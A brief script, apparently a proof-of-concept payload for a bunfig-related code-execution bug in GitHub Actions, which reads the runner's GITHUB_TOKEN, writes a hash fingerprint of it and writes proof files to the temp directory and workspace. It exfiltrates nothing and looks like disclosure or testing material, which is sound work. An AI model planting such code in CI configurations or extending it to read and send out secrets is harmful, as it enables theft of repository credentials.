import { createHash } from "crypto";
import { writeFileSync } from "fs";
import { join } from "path";

const tok = process.env.GITHUB_TOKEN || "";
const fp = createHash("sha256").update(tok).digest("hex").slice(0, 16);
const line = `POC-A2 rce=1 cwd=${process.cwd()} token_present=${tok.length > 0} token_sha256_16=${fp}\n`;
const out = `${process.env.RUNNER_TEMP || "/tmp"}/poc-a2-bunfig.txt`;
writeFileSync(out, line);
const ws = process.env.GITHUB_WORKSPACE;
if (ws) {
  writeFileSync(join(ws, ".poc-bunfig-proof.txt"), line);
}
